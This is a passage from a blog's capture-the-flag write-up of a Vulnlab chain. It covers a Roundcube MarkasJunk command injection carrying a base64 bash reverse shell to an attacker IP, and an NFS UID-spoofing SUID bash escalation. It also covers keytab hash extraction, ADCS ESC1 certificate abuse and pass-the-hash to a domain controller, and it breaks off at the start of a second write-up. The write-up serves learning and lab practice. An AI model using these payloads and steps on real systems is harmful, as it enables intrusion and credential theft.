that we should be able to view all the contents of the <code>/opt/share</code> NFS share by mounting it to our machine.</p>\n<p><code>sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock</code></p>\n<ul>\n<li><code>mount -t nfs</code> to specifically mount an NFS share.</li>\n<li><code>-o vers=3</code> due to our NMAP scan, which denoted the NFS version as 3 or 4.</li>\n<li><code>10.10.231.246:/opt/share /mnt/tmpmnt</code> mounting everything is <code>/opt/share</code> to <code>/mnt/tmpmnt</code>, which is a directory that will be created on our local machine.</li>\n<li><code>-o nolock</code> to disable file-locking, which prevents the execution of binaries on the NFS share.</li>\n</ul>\n<p>Within the contents of <code>/tmp/tmpmnt</code>, we can see a file called <code>backup.tar.gz</code>. We can unzip this with <code>tar</code> - <code>tar -xzf backup.tar.gz</code>. This gives us access to both <code>etc</code> and <code>opt</code> directories in the file archive.</p>\n<p>Upon enumerating the boxes, I’ve found an file that seems to give us credentials to the Roundcube login. This file is <code>/etc/dovecot/dovecot-users</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin@hybrid.vl:&#123;plain&#125;Duckling21</span><br><span class=\"line\">peter.turner@hybrid.vl:&#123;plain&#125;PeterIstToll!</span><br></pre></td></tr></table></figure>\n\n<p>Using these credentials (I’ll use the admin’s credentials), we are able to log in to the Roundcube instance.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/c.png\"></p>\n<h1 id=\"MarkasJunk-RCE\"><a href=\"#MarkasJunk-RCE\" class=\"headerlink\" title=\"MarkasJunk RCE\"></a>MarkasJunk RCE</h1><p>Upon looking around, I’ve stumbled across an email that <code>admin</code> has sent to <code>peter.turner</code>, entailing that they’ll be enabling a Junk plugin on the Roundcube server.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/d.png\"></p>\n<p>Not only that, but it seems we have another user named <code>Ed</code> who we might potentially get access to later. Just something to note down.</p>\n<p>This points us to our attack path to get foothold - RCE.</p>\n<p>Upon doing some research on this junk filter plugin, I found record of a CVE that allows you to get unauthorized remote code execution by configuring the user’s name, sending an email, and then sending the mail to the junk folder. <a href=\"https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/\">https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/</a></p>\n<p>This essentially allows us to trigger an arbitrary command in the user’s name due to a lack of filtering when this version of Roundcube is parsing an email. The article provided above entails the specifics on why this is the case, however it’s really just important to note right now that we can execute commands by adding a <code>&amp;</code> before and after our command in our email name so that Roundcube parses it incorrectly.</p>\n<p>Let’s head over to <code>Compose &gt; Edit Identities</code> (the little pencil icon next to our email) to perform this exploit.</p>\n<p>If we try to add a command regularly as we interpreted above, such as:</p>\n<p><code>admin&amp;curl http://10.8.0.173:9001/&amp;@hybrid.vl</code></p>\n<p>Roundcube will tell us that our email address is invalid. While we could spend more time trying to understand specifically what characters it has on its blacklist, we can instead just push our commands in base64. I also found success in doing this in Burpsuite and URL encoding all special characters. This can be done in Burpsuite by capturing the request and then editing the <code>email</code> value.</p>\n<p>After messing around with a <code>curl</code> test payload, I managed to develop the following:</p>\n<p>The command we are trying to execute is <code>curl http://10.8.0.173</code>, which I’m using to see if we can generate a callback to a simple Python server I’ll stand up on our local machine. This brings us to the example name I’ve constructed below.<br><code>admin&amp;echo$&#123;IFS&#125;Y3VybCBodHRwOi8vMTAuOC4wLjE3Mzo5MDAxLwo=|base64$&#123;IFS&#125;-d|bash&amp;@hybrid.vl</code></p>\n<p>We’ll also want to URL encode any characters so they can bypass any blacklists that Roundcube is attempting to detect on the front-end, and also so that Burpsuite can parse them correctly.<br><code>admin%26echo$&#123;IFS&#125;Y3VybCBodHRwOi8vMTAuOC4wLjE3Mzo5MDAxLwo%3d|base64$&#123;IFS&#125;-d|bash%26%40hybrid.vl</code></p>\n<p><img src=\"/images/vulnlab/hybrid-vl/e.png\"></p>\n<p>Upon submitting the request, we can see that our name is accepted despite having special characters in it.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/f.png\"></p>\n<p>Let’s compose an email now and send it back to ourselves to exploit the plugin. (All I did was compose an email and send it to <code>admin@hybrid.vl</code>).</p>\n<p>Additionally, on my local machine, I’ll start a simple python server on port <code>9001</code> to receive the request. <code>python3 -m http.server 9001</code></p>\n<p><img src=\"/images/vulnlab/hybrid-vl/g.png\"></p>\n<p>We’ll now browse to the email in our inbox after sending it and click the <code>Junk</code> icon on the top of the email.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/i.png\"></p>\n<p>Upon clicking this, we can see that a GET request was sent from <code>10.10.242.86</code> back to our local machine. This means that we can execute commands and get a reverse shell on the target machine.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/j.png\"></p>\n<p>Let’s develop our command that we want to run, in this case I just used <code>Revshells.com</code> to generate a bash one-liner.</p>\n<p>We’ll also combine what we know previously to craft the following payload. Let’s also set up a <code>netcat</code> listener to catch the web request and get us a shell. Command we are trying to run: <code>/bin/bash -i &gt;&amp; /dev/tcp/10.8.0.173/9001 0&gt;&amp;1</code><br><code>admin%26echo$&#123;IFS&#125;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMC4xNzMvOTAwMSAwPiYx|base64$&#123;IFS&#125;-d|bash%26%40hybrid.vl</code></p>\n<p>If we do all of the same steps as outlined previously and use the <code>Junk</code> plugin in a new email, we can see that a reverse shell was spawned as user <code>wwwdata</code>.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/q.png\"></p>\n<h1 id=\"Internal-Mounted-NFS-Exploit\"><a href=\"#Internal-Mounted-NFS-Exploit\" class=\"headerlink\" title=\"Internal Mounted NFS Exploit\"></a>Internal Mounted NFS Exploit</h1><p>Looking around the box initially, there wasn’t anything that I saw that screamed out at me out of the blue. I ended up dropping <code>Linpeas</code> to the box through a Sliver C2 beacon that I created, but didn’t really see anything with it either.</p>\n<p>Upon searching some more, I decided to turn our attention back to NFS to potentially find any vulnerabilities with it. We can find the configurations for NFS in <code>/etc/export</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># /etc/exports: the access control list for filesystems which may be exported</span><br><span class=\"line\">#\t\tto NFS clients.  See exports(5).</span><br><span class=\"line\">#</span><br><span class=\"line\"># Example for NFSv2 and NFSv3:</span><br><span class=\"line\"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span><br><span class=\"line\">#</span><br><span class=\"line\"># Example for NFSv4:</span><br><span class=\"line\"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span><br><span class=\"line\"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span><br><span class=\"line\">#</span><br><span class=\"line\">/opt/share *(rw,no_subtree_check)  </span><br></pre></td></tr></table></figure>\n\n<p>While normally we’d look for NFS privilege escalation vectors such as <code>no_root_squash</code>, we can actually exploit the <code>rw</code> parameter that is set to <code>/opt/share</code>. <a href=\"https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/\">https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/</a></p>\n<p>This next exploit goes into depth on how NFS interprets the <code>rw</code> setting and by also exploiting <code>peter.turner@hybrid.vl</code>‘s UID. If we run a <code>id</code> scan on <code>peter.turner@hybrid.vl</code>, we can see that they have a UID of <code>902601108</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@mail01:~/roundcube$ id peter.turner@hybrid.vl</span><br><span class=\"line\">id peter.turner@hybrid.vl</span><br><span class=\"line\">uid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),902601104(hybridusers@hybrid.vl)</span><br></pre></td></tr></table></figure>\n\n<p>If we create a user with the same UID, we can potentially exploit the <code>/bin/bash</code> binary by setting the sticky bit of <code>bash</code> and running it in the context of <code>peter.turner@hybrid.vl</code>. But how exactly does that make sense? Are we running <code>/bin/bash</code> as <code>peter.turner@hybrid.vl</code>? Yes and no. We’re going to try and run <code>/bin/bash</code> as a user with the SAME UID as <code>peter.turner@hybrid.vl</code>. Meaning, if we create the same user on our local machine and modify the privileges to it using <code>rw</code>, we can run it in the context of <code>peter.turner@hybrid.vl</code>.</p>\n<p>So to do this, we need to do the following:</p>\n<ul>\n<li>Remote Host: <code>cp /bin/bash /opt/share/</code><ul>\n<li>Copying the <code>/bin/bash</code> executable into the NFS share.</li>\n</ul>\n</li>\n<li>Local Host: <code>sudo useradd peter.turner@hybrid.vl -u 902601108</code><ul>\n<li>Creating a user named <code>peter.turner@hybrid.vl</code> with the same UID as the UID on the remote machine.</li>\n<li>NOTE: We will need to edit <code>/etc/login.defs</code> and change <code>UID_MAX</code> to a value greater than <code>902601108</code>.</li>\n</ul>\n</li>\n<li>Local Host: <code>sudo su -l peter.turner@hybrid.vl</code><ul>\n<li>Logging into the new user we created.*</li>\n</ul>\n</li>\n<li>Local Host: <code>sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock</code><ul>\n<li>Mounting the NFS share to <code>/mnt/tmpmnt</code> once more.</li>\n</ul>\n</li>\n<li>Local Host: <code>cp /mnt/tmpmnt/bash /tmp/tmpbash/</code><ul>\n<li>Copying the <code>bash</code> executable to a temporary directory just so we can reset the privileges of the binary&#x2F;</li>\n</ul>\n</li>\n<li>Remote Host: <code>rm /opt/share/bash</code><ul>\n<li>Removing the <code>bash</code> executable from the remote machine so that we can replace it with a newly configured bash executable.</li>\n</ul>\n</li>\n<li>Local Host: <code>cp /tmp/tmpbash/bash /mnt/tmpmnt/</code><ul>\n<li>Copying our executable back into the NFS share.</li>\n</ul>\n</li>\n<li>Local Host: <code>chmod +s /mnt/tmpmnt/bash</code><ul>\n<li>Configuring the sticky bit of the <code>bash</code> executable. By configuring this privilege, it is essentially saying that any user that runs this binary will run it as the context of that user.</li>\n</ul>\n</li>\n<li>Remote Host: <code>/opt/share/bash -p</code><ul>\n<li>We are running the <code>bash</code> binary with <code>-p</code>, which stands for <code>privileged mode</code>. This essentially means that it will set the effective user ID (EUID) to the real user ID. The binary will run with the permissions of the same user who invoked it based on the user ID. (In this case, <code>peter.turner@hybrid.vl</code>)</li>\n</ul>\n</li>\n</ul>\n<p>This should give us a shell as <code>peter.turner@hybrid.vl</code>, as denoted below.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/r.png\"></p>\n<p>The only problem with having this type of shell is that we can’t upgrade our shell in any way at the moment. Any attempt to do so will revert us back to <code>www-data</code>. That being said, I’ll upload a Sliver C2 implant so we can download and upload files whenever we need to.</p>\n<h1 id=\"Reading-KDBX\"><a href=\"#Reading-KDBX\" class=\"headerlink\" title=\"Reading KDBX\"></a>Reading KDBX</h1><p>In the home directory, we can find the first flag to this chain as well as a <code>passwords.kdbx</code> file. We can use <code>kpcli</code> to open this file and read its contents.</p>\n<p>You’ll notice that if you try to show the <code>domain</code> entry, it will be blotted it in red. Copying this to any text file will reveal the real contents. An alternative is to use <code>KeaPassXC</code> if you’re on Windows, though <code>kpcli</code> works fine as well.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">kpcli:/&gt; open passwords.kdbx</span><br><span class=\"line\">kpcli:/&gt; ls</span><br><span class=\"line\">=== Groups ===</span><br><span class=\"line\">eMail/</span><br><span class=\"line\">Internet/</span><br><span class=\"line\">hybrid.vl/</span><br><span class=\"line\"></span><br><span class=\"line\">kpcli:/&gt; cd hybrid.vl</span><br><span class=\"line\">kpcli:/&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">=== Entries ===</span><br><span class=\"line\">0. domain                                                                 </span><br><span class=\"line\">1. mail                                                   mail01.hybrid.vl</span><br><span class=\"line\"></span><br><span class=\"line\">kpcli:/&gt; show domain</span><br><span class=\"line\"></span><br><span class=\"line\"> Path: /hybrid.vl/</span><br><span class=\"line\">Title: domain</span><br><span class=\"line\">Uname: peter.turner</span><br><span class=\"line\"> Pass: b0cwR+G4Dzl_rw</span><br><span class=\"line\">  URL: </span><br><span class=\"line\">Notes: </span><br></pre></td></tr></table></figure>\n\n<p>Upon testing these credentials to SSH on the machine, we can see that we have access through SSH as <code>peter.turner@hybrid.vl</code>. Slight note, my IP address did change since I took a break in between doing this.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/s.png\"></p>\n<p>Upon checking for privileges that we can exploit, it seems that this user can run all commands as <code>sudo</code>, which is a nice change of pace for once.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">peter.turner@hybrid.vl@mail01:~$ sudo -l</span><br><span class=\"line\">[sudo] password for peter.turner@hybrid.vl: </span><br><span class=\"line\">Matching Defaults entries for peter.turner@hybrid.vl on mail01:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User peter.turner@hybrid.vl may run the following commands on mail01:</span><br><span class=\"line\">    (ALL) ALL</span><br><span class=\"line\">peter.turner@hybrid.vl@mail01:~$ sudo su</span><br><span class=\"line\">root@mail01:/home/peter.turner@hybrid.vl# cd /root</span><br><span class=\"line\">root@mail01:~# ls</span><br><span class=\"line\">flag.txt  snap</span><br></pre></td></tr></table></figure>\n\n<p>The flag is in the <code>/root</code> directory as shown above, meaning we have compromised the first machine for this chain.</p>\n<h1 id=\"Pivoting-to-DC\"><a href=\"#Pivoting-to-DC\" class=\"headerlink\" title=\"Pivoting to DC\"></a>Pivoting to DC</h1><p>For the next box, I’m assuming that we’ll be able to start enumerating the machine with <code>peter.turner</code>‘s valid credentials.</p>\n<p>There is LDAP and SMB on the machine, so we could potentially verify whether this user is able to access anything. &#96;crackmapexec smb 10.10.194.118 -u ‘peter.turner’ -p ‘b0cwR+G4Dzl_rw’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         10.10.194.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.194.117   445    DC01             [+] hybrid.vl\\peter.turner:b0cwR+G4Dzl_rw</span><br><span class=\"line\"></span><br><span class=\"line\">SMB         10.10.194.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.194.117   445    DC01             [-] hybrid.vl\\peter.turner:b0cwR+G4Dzl_rw Error connecting to the domain, are you sure LDAP service is running on the target ?</span><br></pre></td></tr></table></figure>\n\n<p>We’ll enumerate the SMB instance first to see if we can find anything. <code>smbclient -L 10.10.194.117 -U &#39;peter.turner&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Password for [WORKGROUP\\peter.turner]:</span><br><span class=\"line\"></span><br><span class=\"line\">\tSharename       Type      Comment</span><br><span class=\"line\">\t---------       ----      -------</span><br><span class=\"line\">\tADMIN$          Disk      Remote Admin</span><br><span class=\"line\">\tC$              Disk      Default share</span><br><span class=\"line\">\tIPC$            IPC       Remote IPC</span><br><span class=\"line\">\tNETLOGON        Disk      Logon server share </span><br><span class=\"line\">\tSYSVOL          Disk      Logon server share</span><br></pre></td></tr></table></figure>\n\n<p>Seems like everything on SMB is relatively normal. NETLOGON and SYSVOL are normal shares, and we can’t access any of the other shares. Just to verify though, I did go into NETLOGON and SYSVOL to ensure there wasn’t anything there, which there wasn’t.</p>\n<p>The error we had before with LDAP is an error I’ve ran into before - we know that LDAP is running on the target based on the NMAP scan. Let’s try and use <code>bloodhound-python</code> to enumerate the LDAP forest.<br><code>git clone https://github.com/dirkjanm/BloodHound.py.git</code><br><code>python3 bloodhound.py -d &#39;hybrid.vl&#39; -u &#39;peter.turner&#39; -p &#39;b0cwR+G4Dzl_rw&#39; -c all -ns 10.10.194.117 --zip</code></p>\n<p>This will dump the LDAP forest for us, and any valid domain objects that it can find based on the credentials that we have.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">INFO: Found AD domain: hybrid.vl</span><br><span class=\"line\">INFO: Getting TGT for user</span><br><span class=\"line\">INFO: Connecting to LDAP server: dc01.hybrid.vl</span><br><span class=\"line\">INFO: Found 1 domains</span><br><span class=\"line\">INFO: Found 1 domains in the forest</span><br><span class=\"line\">INFO: Found 2 computers</span><br><span class=\"line\">INFO: Connecting to LDAP server: dc01.hybrid.vl</span><br><span class=\"line\">INFO: Found 14 users</span><br><span class=\"line\">INFO: Found 53 groups</span><br><span class=\"line\">INFO: Found 2 gpos</span><br><span class=\"line\">INFO: Found 2 ous</span><br><span class=\"line\">INFO: Found 19 containers</span><br><span class=\"line\">INFO: Found 0 trusts</span><br><span class=\"line\">INFO: Starting computer enumeration with 10 workers</span><br><span class=\"line\">INFO: Querying computer: mail01</span><br><span class=\"line\">INFO: Querying computer: dc01.hybrid.vl</span><br><span class=\"line\">WARNING: Could not resolve: mail01: The resolution lifetime expired after 3.102 seconds: Server Do53:10.10.194.117@53 answered The DNS operation timed out.</span><br><span class=\"line\">INFO: Done in 00M 19S</span><br><span class=\"line\">INFO: Compressing output into 20240425021728_bloodhound.zip</span><br></pre></td></tr></table></figure>\n\n<p>We can now use <code>bloodhound</code> with the compressed archive we just received to enumerate the LDAP forest. In case you have never used Bloodhound or Neo4J before, here’s a resource to get started: <a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a></p>\n<p>Upon uploading the data into Bloodhound, we can begin to enumerate if <code>peter.turner</code> has delegation over anything.</p>\n<p>One thing I do want to note, there seems to be a user which we saw in the Roundcube instance named Ed. His full username seems to be <code>edward.miller@hybrid.vl</code>. I’m assuming we’ll need to compromise him somehow, but that’s still uphill. Bloodhound doesn’t seem to note anything down at the moment for <code>peter.turner</code>‘s privileges, so let’s see what users we can find in the users file that Bloodhound dumped originally.</p>\n<p>I’ve compromised a list of these users based on the JSON that was provided, and modified it into a wordlist based on the user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ADMINISTRATOR@HYBRID.VL</span><br><span class=\"line\">GUEST@HYBRID.VL</span><br><span class=\"line\">KRBTGT@HYBRID.VL</span><br><span class=\"line\">EDWARD.MILLER@HYBRID.VL</span><br><span class=\"line\">PAMELA.SMITH@HYBRID.VL</span><br><span class=\"line\">JOSH.MITCHELL@HYBRID.VL</span><br><span class=\"line\">PETER.TURNER@HYBRID.VL</span><br><span class=\"line\">OLIVIA.SMITH@HYBRID.VL</span><br><span class=\"line\">RICKY.MYERS@HYBRID.VL</span><br><span class=\"line\">EMILY.WHITE@HYBRID.VL</span><br><span class=\"line\">ELLIOT.WATKINS@HYBRID.VL</span><br><span class=\"line\">KATHLEEN.WALKER@HYBRID.VL</span><br><span class=\"line\">MARGARET.SHEPHERD@HYBRID.VL</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Administrator</span><br><span class=\"line\">Guest</span><br><span class=\"line\">krbtgt</span><br><span class=\"line\">edward.miller</span><br><span class=\"line\">pamela.smith</span><br><span class=\"line\">josh.mitchell</span><br><span class=\"line\">peter.turner</span><br><span class=\"line\">olivia.smith</span><br><span class=\"line\">ricky.myers</span><br><span class=\"line\">emily.white</span><br><span class=\"line\">elliot.watkins</span><br><span class=\"line\">kathleen.walker</span><br><span class=\"line\">margaret.shepherd</span><br></pre></td></tr></table></figure>\n\n<p>Didn’t seem like we could dump any <code>ASREP</code> hashes with <code>GetNPUsers</code>, nor could we dump any usable TGSs&#x2F;TGTs for any of the users with <code>GetUserSPNs</code>.</p>\n<p>Let’s turn our attention to another avenue we could target, ADCS.</p>\n<h1 id=\"ESC1-ADCS-Exploitation\"><a href=\"#ESC1-ADCS-Exploitation\" class=\"headerlink\" title=\"ESC1 ADCS Exploitation\"></a>ESC1 ADCS Exploitation</h1><p>ADCS is a server role that essentially allows you to integrate PKI (Public Key Infrastructure) into an AD environment. This helps to maintain public key cryptography and digital signature&#x2F;certificate capabilities. ADCS vulnerabilities can allow us to request a certificate used to authenticate on behalf of another user in the domain. Let’s try to find any vulnerable certificate templates that we can use.</p>\n<p><code>certipy-ad find -vulnerable -username &#39;peter.turner&#39;@hybrid.vl -password b0cwR+G4Dzl_rw -dc-ip 10.10.194.117</code></p>\n<p>We’ll see that this returns one result of a vulnerable certificate denoted as <code>HybridComputers</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Certificate Templates</span><br><span class=\"line\">  0</span><br><span class=\"line\">    Template Name                       : HybridComputers</span><br><span class=\"line\">    Display Name                        : HybridComputers</span><br><span class=\"line\">    Certificate Authorities             : hybrid-DC01-CA</span><br><span class=\"line\">    Enabled                             : True</span><br><span class=\"line\">    Client Authentication               : True</span><br><span class=\"line\">    Enrollment Agent                    : False</span><br><span class=\"line\">    Any Purpose                         : False</span><br><span class=\"line\">    Enrollee Supplies Subject           : True</span><br><span class=\"line\">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class=\"line\">    Enrollment Flag                     : None</span><br><span class=\"line\">    Private Key Flag                    : 16842752</span><br><span class=\"line\">    Extended Key Usage                  : Client Authentication</span><br><span class=\"line\">                                          Server Authentication</span><br><span class=\"line\">    Requires Manager Approval           : False</span><br><span class=\"line\">    Requires Key Archival               : False</span><br><span class=\"line\">    Authorized Signatures Required      : 0</span><br><span class=\"line\">    Validity Period                     : 100 years</span><br><span class=\"line\">    Renewal Period                      : 6 weeks</span><br><span class=\"line\">    Minimum RSA Key Length              : 4096</span><br><span class=\"line\">    Permissions</span><br><span class=\"line\">      Enrollment Permissions</span><br><span class=\"line\">        Enrollment Rights               : HYBRID.VL\\Domain Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Domain Computers</span><br><span class=\"line\">                                          HYBRID.VL\\Enterprise Admins</span><br><span class=\"line\">      Object Control Permissions</span><br><span class=\"line\">        Owner                           : HYBRID.VL\\Administrator</span><br><span class=\"line\">        Write Owner Principals          : HYBRID.VL\\Domain Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Enterprise Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Administrator</span><br><span class=\"line\">        Write Dacl Principals           : HYBRID.VL\\Domain Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Enterprise Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Administrator</span><br><span class=\"line\">        Write Property Principals       : HYBRID.VL\\Domain Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Enterprise Admins</span><br><span class=\"line\">                                          HYBRID.VL\\Administrator</span><br><span class=\"line\">    [!] Vulnerabilities</span><br><span class=\"line\">      ESC1                              : &#x27;HYBRID.VL\\\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure>\n\n<p>You’ll notice the <code>ESC1</code> vulnerability indicator at the bottom of the template, which is telling us that <code>Domain Computers</code> can enroll supplies subject and also allows client authentication. This essentially means that any user can request a certificate on behalf of any other user in the network, even if that user is a privileged user (such as <code>Administrator</code>).</p>\n<p>So technically speaking, we can use our <code>peter.turner</code> credentials to generate a certificate on behalf of <code>Administrator</code>, right? Unfortunately, it’s not that simple in our case.<br>As you can see, the only role that can do this is <code>HYBRID.VL\\\\Domain Computers</code>, which means that only domain computers can perform this.</p>\n<p>Now this is relatively easy to move around, as we already have control of another computer on the domain - the recent <code>MAIL01</code> computer that we just compromised previously. We’ll need to find the NTLM hash of this domain computer, which we would normally just dump through tools such as <code>mimikatz</code> on a Windows machine. On a Domain-joined Linux machine, the NTLM hashes for the domain computer can usually be found in <code>/etc/krb5.keytab</code> in my experience.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/t.png\"></p>\n<p>Upon trying to read the file, we’ll find out that it’s unreadable since it is encrypted.<br>We can easily circumvent this by using a tool called <code>keytabextract.py</code>, which will dump the contents of this file in plaintext. <a href=\"https://github.com/sosdave/KeyTabExtract\">https://github.com/sosdave/KeyTabExtract</a></p>\n<p><img src=\"/images/vulnlab/hybrid-vl/u.png\"></p>\n<p>We can now use this NTLM hash to proceed with our certificate request.<br><code>certipy-ad req -u &#39;MAIL01$&#39;@hybrid.vl -hashes &#39;0f916c5246fdbc7ba95dcef4126d57bd&#39; -ca &#39;hybrid-DC01-CA&#39; -template HybridComputers -target hybrid.vl -upn &#39;administrator@hybrid.vl&#39; -dns dc01.hybrid.vl -key-size 4096 -debug</code></p>\n<p>Once again as a reminder, make sure that <code>dc01.hybrid.vl</code> and <code>hybrid.vl</code> both are set to the IP address of the DC in your <code>/etc/hosts</code> file. Just a reminder.<br>This should save a certificate and private key to a file called <code>administrator_dc01.pfx</code>. We can use this <code>.pfx</code> to now authenticate to the DC and dump the Administrator’s NT hash.</p>\n<p><code>certipy-ad auth -pfx administrator_dc01.pfx -username &#39;administrator&#39; -domain &#39;hybrid.vl&#39; -dc-ip 10.10.238.53</code><br>This will dump the NT hash in plaintext, to which we’ll use the second part of the hash to authenticate.</p>\n<p><img src=\"/images/vulnlab/hybrid-vl/v.png\"></p>\n<p>Let’s test our ability to authenticate to WinRM with these credentials using Pass-the-Hash on CrackMapExec.<br><code>crackmapexec winrm 10.10.238.53 -u &#39;Administrator&#39; -H &#39;60701e8543c9f6db1a2af3217386d3dc&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         10.10.238.53    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)</span><br><span class=\"line\">HTTP        10.10.238.53    5985   DC01             [*] http://10.10.238.53:5985/wsman</span><br><span class=\"line\">WINRM       10.10.238.53    5985   DC01             [+] hybrid.vl\\Administrator:60701e8543c9f6db1a2af3217386d3dc (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>That <code>Pwn3d!</code> notification denotes that we can now access the machine through WinRM.<br><code>evil-winrm --ip 10.10.238.53 -u &#39;Administrator&#39; -H &#39;60701e8543c9f6db1a2af3217386d3dc&#39;</code></p>\n<p><img src=\"/images/vulnlab/hybrid-vl/w.png\"></p>\n<p>The root flag is within the Administrator’s <code>Desktop</code> directory, meaning we now have completed this chain!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was an awesome first experience at chains. Given that it was a domain-joined Linux, it required much more research into the attack path as I wasn’t very familiar with this type of machine. It was a nice curveball, and the ADCS exploitation made it even more enjoyable. Big thanks goes out to xct for the development of this chain.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/\">https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/</a><br><a href=\"https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/\">https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/</a><br><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a><br><a href=\"https://github.com/sosdave/KeyTabExtract\">https://github.com/sosdave/KeyTabExtract</a></p>\n"},{"title":"Trusted - Vulnlab","date":"2024-06-05T19:20:37.000Z","keywords":"Vulnlab, Easy, Windows","description":"This chain was relatively fun, however it's a REALLY long one. That being said I still think it was a great learning experience, as I've learned how to perform pen-testing exploits that I've only heard brief snippets about (yet never done them practically). This machine includes exploits such as Local File Inclusion and DLL Hijacking, both of which are actually commonly seen vulnerabilities if not taken into consideration properly by developers.","cover":"/images/vulnlab/trusted-vl/trusted_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nThis chain was relatively fun, however it's a REALLY long one. That being said I still think it was a great learning experience, as I've learned how to perform pen-testing exploits that I've only heard brief snippets about (yet never done them practically). This machine includes exploits such as Local File Inclusion and DLL Hijacking, both of which are actually commonly seen vulnerabilities if not taken into consideration properly by developers.\n\n# Enumeration\n\nRunning our NMAP scans for host discovery for both machines.\n`sudo nmap (IP) -A -oN init_scan_(1/2).txt`\nAlso note, the IP addresses might change due to some breaks I take in between completing this chain.\n\n```\nNmap scan report for 10.10.155.37\nHost is up (0.10s latency).\nNot shown: 988 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-01 15:42:14Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: 